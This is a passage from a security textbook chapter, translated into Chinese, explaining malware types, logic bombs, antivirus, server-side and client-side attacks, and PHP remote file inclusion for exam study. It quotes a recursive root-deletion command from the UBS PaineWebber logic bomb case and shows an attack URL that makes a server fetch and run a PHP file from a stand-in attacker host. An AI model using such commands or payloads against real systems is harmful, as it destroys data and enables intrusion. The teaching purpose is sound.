
### 恶意软件类型

*   **Stealth virus（隐形病毒）**：一种对操作系统和其他防护软件（如杀毒软件）隐藏自身的病毒。
*   **Polymorphic virus（多态病毒）**：一种在感染新系统时改变其签名的病毒，试图逃避基于签名的杀毒软件。
*   **Multipartite virus（多重病毒）**：一种通过多种传播媒介传播的病毒，也称为 multipart virus。

#### Worms（蠕虫）

Worms 是能够自我传播（独立扩散）的恶意软件。“Worm”一词由 John Brunner 于 1975 年在科幻小说 *The Shockwave Rider* 中创造。Worms 通常通过两种方式造成破坏：一是它们携带的恶意代码；二是由于激进的自我传播导致网络可用性丧失。Worms 引发了历史上一些最具破坏性的网络攻击。

第一个大规模传播的蠕虫是 1988 年的 Morris worm，由 Robert Tappan Morris, Jr. 编写。此后出现了许多互联网蠕虫，包括 2003 年的 Blaster worm、2004 年的 Sasser worm、2008 年及以后的 Conficker worm 等。

#### Trojans（特洛伊木马）

Trojan（也称为 Trojan horse）是一种执行双重功能的恶意软件：一种是良性功能（如游戏），另一种是恶意功能。该术语源自维吉尔史诗 *The Aeneid* 中描述的特洛伊木马。

#### Rootkits（Rootkit/Rootkit工具包）

Rootkit 是一种替换内核和/或操作系统部分组件的恶意软件。用户态 Rootkit 在大多数系统的 Ring 3 下运行，替换“用户空间”中的操作系统组件。常被 Rootkit 替换的二进制文件包括 Linux/UNIX 系统上的 `ls` 或 `ps` 命令，或 Microsoft Windows 系统上的 `dir` 或 `tasklist`。

内核态 Rootkit 替换内核，或加载恶意的可加载内核模块。内核态 Rootkit 在大多数操作系统的 Ring 0 下运行。

#### Packers（加壳工具）

Packers 提供可执行文件的运行时压缩。原始 exe 被压缩，并将一个小型的可执行解压缩器添加到 exe 头部。执行时，解压缩器解包压缩的可执行机器码并运行它。

Packers 是一种中立技术，用于减小可执行文件体积。许多类型的恶意软件使用 Packers，可用于逃避基于签名的恶意软件检测。常见的 Packer 是 UPX (Ultimate Packer for eXecutables)，可在 [https://upx.github.io/](https://upx.github.io/) 获取。

#### Logic Bombs（逻辑炸弹）

*Logic bomb* 是一种在满足逻辑条件时触发的恶意程序，例如处理一定数量的交易后，或在特定日期（也称为 time bomb/定时炸弹）。蠕虫等恶意软件通常包含逻辑炸弹，表现出一种行为，然后在特定日期和时间改变策略。

Roger Duronio 在因年度奖金纠纷心生不满后，成功针对其雇主 UBS PaineWebber 部署了逻辑炸弹。他在 2000 台 UBS PaineWebber 系统上安装了逻辑炸弹，由 2002 年 3 月 4 日上午 9:30 的日期和时间触发：“这一天，公司 2000 台服务器宕机，导致全国约 17,000 名经纪人无法进行交易。近 400 家分支机构受到影响。文件被删除。备份在运行几分钟内也宕机了” [\[29\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0145)。

Duronio 的代码运行了命令 `/usr/sbin/mrm –r / &`（一个递归删除根分区（包括所有文件和子目录）的 UNIX shell 命令）。他被判处联邦监狱 8 年零 1 个月有期徒刑。

#### Antivirus Software（杀毒软件）

Antivirus software 旨在预防和检测恶意软件感染。基于签名的杀毒软件使用已知恶意软件的静态签名。基于启发式的杀毒软件使用基于异常的检测，尝试识别恶意软件的行为特征，如修改引导扇区。

### Server-Side Attacks（服务端攻击）

*Server-side attacks*（也称为 service-side attacks/服务侧攻击）是从攻击者（客户端）直接发起针对监听服务的攻击。攻击过程如 [Fig. 4.20](#Ch004_107-223_B9780443187346000076_1.xhtml#f0105) 所示，`evil.example.com` 对监听在 TCP 445 端口的 `bank.example.com` 发起攻击。

[Fig. 4.20](#Ch004_107-223_B9780443187346000076_1.xhtml#B-f0105) Server-side attack.

打补丁、系统加固、防火墙及其他纵深防御形式可缓解服务端攻击。除非系统经过加固并部署在 DMZ 网络中（我们将在 [Chapter 5](#Ch005_225-293_B9780443187346000039.xhtml)，Domain 4: Communication and Network Security 中讨论），否则组织不应允许来自互联网等不可信网络的直接访问服务器端口。

> **Note**
>
> 服务端攻击利用已安装服务中的漏洞。这不仅仅是“服务器”问题（如运行 Windows Server 2022 的文件服务器）：运行 Ubuntu Linux 22.04 和 Windows 11 等操作系统的台式机和笔记本电脑也运行服务，可能容易受到服务端攻击。有些人倾向于使用“service-side attack”以明确这一区别，但考试使用术语“server-side”。

### Client-Side Attacks（客户端攻击）

*Client-side attacks* 发生在用户下载恶意内容时。与服务端攻击相比，数据流向相反：客户端攻击由受害者发起，从攻击者处下载内容，如 [Fig. 4.21](#Ch004_107-223_B9780443187346000076_1.xhtml#f0110) 所示。

![Fig. 4.21 Client-side attack.](images/B9780443187346000076/f04-21-9780443187346.jpg)

[Fig. 4.21](#Ch004_107-223_B9780443187346000076_1.xhtml#B-f0110) Client-side attack.

对于允许互联网访问的组织，客户端攻击难以缓解。客户端包括文字处理软件、电子表格、媒体播放器和 Web 浏览器。Chrome 和 Firefox 等浏览器实际上是软件集合：浏览器本身，加上 Adobe Acrobat Reader、iTunes、QuickTime 等第三方软件。所有这些都可能容易受到客户端攻击。所有客户端软件都必须打补丁，这是许多组织面临的挑战。

大多数防火墙的入站限制远比出站严格：它们设计用于“拦截坏人”，缓解源自不可信网络的服务端攻击。它们往往无法防止客户端攻击。

### Web Architecture and Attacks（Web 架构与攻击）

15 年前的 World Wide Web 更简单：大多数网页是静态的，用 HTML 渲染。“Web 2.0”的出现带来了动态内容、多媒体和用户创建的数据，增加了 Web 的攻击面：创造了更多攻击向量。PHP（一个“递归首字母缩写”，代表 PHP: Hypertext Preprocessor）等动态 Web 语言使网页功能更强大、更动态，但也更容易受到安全攻击。

一个 PHP 攻击示例是“远程文件包含”攻击。URL（统一资源定位符）如 `https://good.example.com/index.php?file=readme.txt` 引用一个名为 `index.php` 的 PHP 脚本。该脚本动态加载“?”后引用的文件 `readme.txt`，并在浏览器中显示。

攻击者在 Web 服务器 `evil.example.com` 上托管一个名为 `evil.php` 的恶意 PHP 文件，然后操纵 URL，输入：

`https://good.example.com/index.php?file=https://evil.example.com/evil.php`

如果 `good.example.com` 配置不当，它将下载 `evil.php` 并在本地执行，允许攻击者窃取信息、创建后门并执行其他恶意任务。
